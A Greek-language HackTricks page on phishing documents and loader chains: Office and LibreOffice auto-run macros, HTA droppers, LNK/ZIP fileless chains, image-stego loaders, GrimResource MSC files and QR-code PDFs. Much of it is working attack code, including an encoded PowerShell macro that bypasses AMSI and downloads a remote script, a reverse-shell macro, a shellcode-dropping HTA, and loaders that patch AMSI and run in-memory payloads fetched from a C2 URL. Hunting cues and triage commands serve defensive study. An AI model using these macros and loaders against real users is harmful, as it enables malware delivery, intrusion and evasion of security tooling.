# Αρχεία και έγγραφα Phishing

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word εκτελεί επικύρωση δεδομένων αρχείων πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης της δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Αν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατή η μετονομασία του αρχείου με αλλαγή της επέκτασης αρχείου, διατηρώντας παράλληλα τις δυνατότητες εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, εκ σχεδιασμού, αλλά ένα αρχείο DOCM που έχει μετονομαστεί σε RTF θα αντιμετωπιστεί από το Microsoft Word και θα μπορεί να εκτελεί macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί ισχύουν για όλο το λογισμικό της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις πρόκειται να εκτελούνται από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files που αναφέρονται σε ένα remote template (File –Options –Add-ins –Manage: Templates –Go) και περιλαμβάνει macros μπορούν επίσης να “εκτελέσουν” macros.

### External Image Load

Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture και **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Μεταβείτε στο: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Μπορείτε να χρησιμοποιήσετε macros για την εκτέλεση arbitrary code από το document.

#### Autoload functions

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι να τις εντοπίσει το AV.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Χειροκίνητη αφαίρεση metadata

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, για να ανοίξετε το Document Inspector. Κάντε κλικ στο **Inspect** και, στη συνέχεια, στο **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Επέκταση Doc

Όταν ολοκληρώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type** και αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε το αυτό επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε ένα `.docx`** και υπάρχει **αρνητική προκατάληψη** γύρω από την επέκταση **`.docm`** με ενεργοποιημένα macro (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένα web/email gateway τα αποκλείουν πλήρως). Επομένως, αυτή η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Τα έγγραφα LibreOffice Writer μπορούν να ενσωματώνουν Basic macros και να τα εκτελούν αυτόματα όταν ανοίγει το αρχείο, συνδέοντας το macro με το event **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ένα απλό reverse shell macro είναι το εξής:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στο string – το LibreOffice Basic τα χρησιμοποιεί για να κάνει escape στα κυριολεκτικά εισαγωγικά, επομένως τα payloads που τελειώνουν σε `...==""")` διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε το ως `.odt` και συνδέστε το macro με το document event, ώστε να εκτελείται αμέσως κατά το άνοιγμα.
- Κατά την αποστολή email με `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` απαιτείται ώστε να αποσταλούν τα bytes του αρχείου και όχι το string του ονόματος αρχείου ως συνημμένο). Αυτό είναι κρίσιμο όταν γίνεται abuse σε SMTP servers που αποδέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς validation.

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το user interface και εκτελείται ως εφαρμογή με "fully trusted" δικαιώματα, χωρίς τους περιορισμούς του security model ενός browser.

Ένα HTA εκτελείται μέσω του **`mshta.exe`**, το οποίο είναι συνήθως **εγκατεστημένο** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από τον IE**. Επομένως, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Authentication

Υπάρχουν αρκετοί τρόποι για να **εξαναγκάσετε NTLM authentication "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML στα οποία θα έχει πρόσβαση ο χρήστης (ακόμη και HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσουν** ένα **authentication** μόνο με το **άνοιγμα του φακέλου.**

**Ελέγξτε αυτές τις ιδέες και περισσότερες στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή το authentication, αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Ιδιαίτερα αποτελεσματικές campaigns παραδίδουν ένα ZIP που περιέχει δύο νόμιμα έγγραφα-δόλωμα (PDF/DOCX) και ένα κακόβουλο .lnk. Το τέχνασμα είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker και το .lnk τον απομονώνει και τον εκτελεί πλήρως στη μνήμη.<sup>[[2]](#references)</sup>

Τυπική ροή που υλοποιείται από το PowerShell one-liner του .lnk:

1) Εντοπίζει το αρχικό ZIP σε κοινές διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και στον γονικό φάκελο του τρέχοντος working directory.
2) Διαβάζει τα bytes του ZIP και εντοπίζει έναν hardcoded marker (π.χ. xFIQCV). Ό,τι ακολουθεί μετά τον marker είναι το embedded PowerShell payload.
3) Αντιγράφει το ZIP στο %ProgramData%, κάνει extract εκεί και ανοίγει το decoy .docx ώστε να φαίνεται νόμιμο.
4) Κάνει bypass το AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Κάνει deobfuscate το επόμενο stage (π.χ. αφαιρεί όλους τους χαρακτήρες #) και το εκτελεί στη μνήμη.

Παράδειγμα PowerShell skeleton για την απομόνωση και εκτέλεση του embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται reputable PaaS subdomains (π.χ., *.herokuapp.com) και μπορεί να εφαρμόζει gate στα payloads (να σερβίρει benign ZIPs με βάση την IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc, ώστε να ελαχιστοποιούνται τα artifacts στον δίσκο.

Persistence που χρησιμοποιείται στην ίδια chain
- COM TypeLib hijacking του Microsoft Web Browser control, ώστε τα IE/Explorer ή οποιαδήποτε εφαρμογή το ενσωματώνει να εκκινούν ξανά αυτόματα το payload.<sup>[[2]](#references)[[4]](#references)</sup> Δείτε τις λεπτομέρειες και έτοιμες προς χρήση εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files που περιέχουν το ASCII marker string (π.χ., xFIQCV) προσαρτημένο στα archive data.
- .lnk που απαριθμεί parent/user folders για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Business threads μεγάλης διάρκειας που καταλήγουν σε links hosted under trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Ένα ακόμη επαναλαμβανόμενο pattern είναι ένα **document-impersonating `.lnk`** που ανοίγει αμέσως ένα benign lure, ενώ προετοιμάζει την πραγματική chain στο background.<sup>[[3]](#references)</sup>

Παρατηρημένη ροή εργασίας:
1. Το shortcut **μεταμφιέζεται σε PDF** και χρησιμοποιεί το `conhost.exe` ή παρόμοιο proxy για να εκκινήσει έναν obfuscated PowerShell downloader.
2. Το PowerShell τεμαχίζει προφανή tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), ώστε τα naive detections που αναζητούν `iwr`, `gci`, `ren`, `cpi` ή `schtasks` να μην εντοπίζουν την εντολή.
3. Το stager κατεβάζει πρώτα το **decoy document**, το ανοίγει για το θύμα και στη συνέχεια ανακατασκευάζει τα malicious files στο background.
4. Τα payloads μπορεί να εγγράφονται με **junk extensions** και στη συνέχεια να μετονομάζονται αφαιρώντας filler characters, καθυστερώντας την εμφάνιση προφανών `.exe` / `.cpl` artifacts.
5. Το Persistence εγκαθίσταται με ένα **minute-based scheduled task** που εκκινεί ένα trusted host binary από user-writable path.

Ελάχιστα hunting clues από αυτό το pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Ένα χρήσιμο layout staging που πρέπει να αναγνωρίζετε είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ή `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο stage είναι stealthy

Στο case study της Rapid7, το scheduled task εκκινούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε τοποθετηθεί δίπλα του και έκανε export το **`RunFODW`**, το trusted Microsoft binary φόρτωνε μέσω side-loading το CPL του attacker αντί για το legitimate system copy.

Το CPL:
- Διαβάζει ένα blob **AES-256-CBC** από το `C:\Windows\Tasks\editor.dat`
- Το αποκρυπτογραφεί μέσω των **Windows CNG / `bcrypt.dll`**
- Δεσμεύει executable memory και αντιγράφει το decrypted shellcode
- Το εκτελεί έμμεσα, περνώντας τον δείκτη του shellcode ως callback για το **`EnumUILanguagesW`**

Αυτό το τελευταίο βήμα αξίζει να αναζητείται ξεχωριστά: το malware συχνά αποφεύγει ένα άμεσο άλμα `((void(*)())buf)()` και αντ’ αυτού καταχράται ένα **legitimate callback-taking WinAPI** για να μεταφέρει την εκτέλεση.

Το decrypted payload σε αυτή την campaign ήταν **Donut** shellcode, το οποίο στη συνέχεια έκανε πλήρες mapping του τελικού PE στη memory και έκανε patch τα **AMSI/WLDP/ETW** στο current process πριν παραδώσει την εκτέλεση. Για βαθύτερες σημειώσεις σχετικά με το side-loading και το memory-resident post-processing, δείτε:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά hunting pivots:
- `.lnk` που εκκινεί `powershell.exe` ή `conhost.exe` και ακολουθείται από ένα ορατό decoy document.
- Downloads μικρής διάρκειας στο **`C:\Users\Public\`**, που ακολουθούνται από άμεσες μετονομασίες από nonsense extensions.
- Scheduled tasks με αδιάφορα ονόματα, όπως `GoogleErrorReport`, που εκτελούνται από **user-writable directories**.
- Trusted binaries που φορτώνουν αρχεία **`.cpl` / `.dll`** από τον ίδιο non-system directory.
- Base64 text blobs που γράφονται κάτω από το **`C:\Windows\Tasks\`** και στη συνέχεια διαβάζονται από το side-loaded module.

## Payloads οριοθετημένα με steganography σε images (PowerShell stager)

Πρόσφατες loader chains παραδίδουν ένα obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί ένα Base64 PowerShell stager. Αυτό το stager κατεβάζει ένα image (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως plain text ανάμεσα σε μοναδικούς start/end markers. Το script αναζητά αυτούς τους delimiters (παραδείγματα που έχουν παρατηρηθεί in the wild: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το κείμενο ανάμεσά τους, το κάνει Base64-decode σε bytes, φορτώνει το assembly in-memory και καλεί μια γνωστή entry method με το C2 URL.<sup>[[5]](#references)</sup>

Ροή εργασίας
- Στάδιο 1: Archived JS/VBS dropper → αποκωδικοποιεί το embedded Base64 → εκκινεί PowerShell stager με -nop -w hidden -ep bypass.
- Στάδιο 2: PowerShell stager → κατεβάζει image, κάνει carve το marker-delimited Base64, φορτώνει το .NET DLL in-memory και καλεί τη method του (π.χ. VAI), περνώντας το C2 URL και options.
- Στάδιο 3: Ο loader ανακτά το final payload και συνήθως το κάνει inject μέσω process hollowing σε ένα trusted binary (συνήθως το MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Δείτε περισσότερα για το process hollowing και το trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Παράδειγμα PowerShell για carve ενός DLL από image και invocation μιας .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor και loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- Αυτό είναι το ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Οι markers διαφέρουν μεταξύ campaigns.
- Τα AMSI/ETW bypass και η απο-συσκότιση strings εφαρμόζονται συνήθως πριν από το loading του assembly.
- Hunting: σαρώστε τα downloaded images για γνωστά delimiters· εντοπίστε PowerShell που προσπελαύνει images και αμέσως αποκωδικοποιεί Base64 blobs.

Δείτε επίσης τα stego tools και τις τεχνικές carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ένα συχνό αρχικό stage είναι ένα μικρό, heavily-obfuscated `.js` ή `.vbs` που παραδίδεται μέσα σε archive. Ο μοναδικός σκοπός του είναι να αποκωδικοποιήσει ένα ενσωματωμένο Base64 string και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass`, ώστε να bootstrapάρει το επόμενο stage μέσω HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Ανάγνωση των περιεχομένων του ίδιου του αρχείου
- Εντοπισμός ενός Base64 blob μεταξύ junk strings
- Αποκωδικοποίηση σε ASCII PowerShell
- Εκτέλεση με `wscript.exe`/`cscript.exe`, καλώντας το `powershell.exe`

Hunting cues
- Archived JS/VBS attachments που κάνουν spawn το `powershell.exe` με `-enc`/`FromBase64String` στη command line.
- `wscript.exe` που εκκινεί το `powershell.exe -nop -w hidden` από user temp paths.

## MSC documents ως execution containers (GrimResource)

Τα Microsoft Management Console files (`.msc`) είναι XML console definitions που ανοίγονται κανονικά από το `mmc.exe`. Το **GrimResource** weaponizes μια αναφορά `StringTable` σε resource του `apds.dll` που περιέχει ένα παλιό XSS primitive, με αποτέλεσμα ένας χρήστης που ανοίγει την crafted console να προκαλεί την εκτέλεση JavaScript μέσα στο `mmc.exe`. Τα observed samples συνδύαζαν obfuscation βασισμένο στο `transformNode` με **DotNetToJScript**, για να κάνουν instantiate ένα .NET payload χωρίς το συνηθισμένο Office-macro path.<sup>[[9]](#references)</sup>

Για static triage, αντιμετωπίστε ένα untrusted MSC ως text και **μην το ανοίξετε με διπλό κλικ**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
High-signal runtime pivots είναι το `mmc.exe` να φορτώνει το CLR ή script components, να δημιουργεί network connections ή να εκκινεί τα `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ή ένα μη αναμενόμενο executable. Το format είναι legitimate, επομένως τα detections θα πρέπει να συσχετίζουν **origin + suspicious XML/script content + συμπεριφορά του `mmc.exe`** αντί να κάνουν blocking σε κάθε MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirectors και payload gating

Ένα PDF δεν χρειάζεται exploit για να είναι χρήσιμο. Πρόσφατες campaigns τοποθετούν έναν **QR code ή ordinary link** σε ένα έγγραφο που φαίνεται benign, μεταφέρουν το browser session μακριά από τους mail controls και εξατομικεύουν τον προορισμό με τη διεύθυνση του παραλήπτη. Η Microsoft documented PDFs του 2025, των οποίων τα QR URLs ήταν μοναδικά ανά παραλήπτη και οδηγούσαν σε RaccoonO365 credential-harvesting infrastructure. Μια παράλληλη chain χρησιμοποιούσε IP/environment gating για να επιστρέφει ένα JavaScript/MSI path σε επιλεγμένους visitors, αλλά ένα benign PDF σε scanners ή disallowed clients.<sup>[[10]](#references)</sup>

Κάντε triage τόσο στα PDF actions όσο και στα rendered QR codes. Ένα QR μπορεί να είναι vector-drawn αντί να είναι αποθηκευμένο ως extractable image, επομένως κάντε rasterize σε κάθε σελίδα, καθώς και extract των embedded images:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Επιθεωρήστε τους decoded προορισμούς και τα redirects από ένα isolated analysis system χωρίς authentication. Χρήσιμα hunting features περιλαμβάνουν PDFs μόνο με QR και σχεδόν κενά mail bodies, το email του παραλήπτη embedded σε query parameter, αρκετά redirects μέσω reputable hosting, καθώς και διαφορετικό content ανάλογα με το IP, τη γεωτοποθεσία, τα cookies, τον referrer ή το user agent. Συγκρίνετε τα requests με controlled profiles, επειδή ένα μόνο sandbox fetch μπορεί να λάβει μόνο το decoy.<sup>[[10]](#references)</sup>

## Windows αρχεία για κλοπή NTLM hashes

Ελέγξτε τη σελίδα σχετικά με **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Καμπάνια ZipLine: Μια εξελιγμένη επίθεση phishing με στόχο εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Παρακολούθηση του tradecraft του Dropping Elephant μέσω μιας China-themed loader chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Νέα τεχνική COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Ο PhantomVAI Loader παραδίδει μια σειρά από infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console για initial access και evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Οι threat actors εκμεταλλεύονται τη φορολογική περίοδο για την ανάπτυξη tax-themed phishing campaigns](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
